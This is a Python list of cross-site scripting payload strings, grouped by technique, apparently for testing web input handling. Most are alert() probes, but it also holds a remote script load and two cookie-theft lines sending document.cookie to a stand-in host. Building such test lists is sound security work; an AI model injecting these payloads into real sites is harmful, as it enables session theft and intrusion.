XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    # Image-based payloads
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<img src=1 href=1 onerror=\"javascript:alert('XSS')\">",
    # SVG-based payloads
    "<svg/onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script></svg>",
    # Input-based payloads
    "<input onfocus='alert(\"XSS\")' autofocus>",
    "<textarea onfocus='alert(\"XSS\")'>",
    # Attribute injection
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<button onclick='alert(\"XSS\")'>Click me</button>",
    # Event handler injections
    "<body onload='alert(\"XSS\")'>",
    "<div style='animation-name:rotation' onanimationstart='alert(\"XSS\")'>",
    # Iframe and object tags
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<object data='javascript:alert(\"XSS\")'></object>",
    # CSS-based payloads
    "<div style=\"width:expression(alert('XSS'))\">",
    # Complex payloads
    "';alert(String.fromCharCode(88,83,83))//",
    "\" onmouseover=alert('XSS') \"",
    '<marquee onstart=alert("XSS")>XSS</marquee>',
    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
    # External script injections
    "<script src='http://example.com/malicious.js'></script>",
    "<img src='http://example.com/image.jpg' onerror='alert(\"XSS\")'>",
    # Cookie theft simulation
    "<script>document.location='http://example.com?c='+document.cookie</script>",
    "<script>fetch('http://example.com?c='+document.cookie)</script>",
    # Encoded payloads
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "%3Cimg%20src='x'%20onerror='alert(\"XSS\")'%3E",
]
